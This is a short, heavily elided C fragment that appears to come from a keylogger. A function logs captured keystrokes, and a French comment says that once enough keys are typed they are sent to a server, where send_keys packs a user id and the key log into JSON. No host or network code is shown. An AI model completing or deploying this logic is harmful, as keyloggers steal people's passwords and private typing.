...
void send_keys(void)
{
    ...
    char data[MAX_KEYS + 10000];
    snprintf(data, MAX_KEYS + 10000, "{\"uid\":\"%s\",\"keys\": \"%s\"}", uid, key_log);
...
void log_key(int key)
{
    ...
    if (value_in_string_key)
    {
        ...
        if (current_key_log_size >= MAX_KEYS)
        { // vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
            send_keys();
        }
    }
}
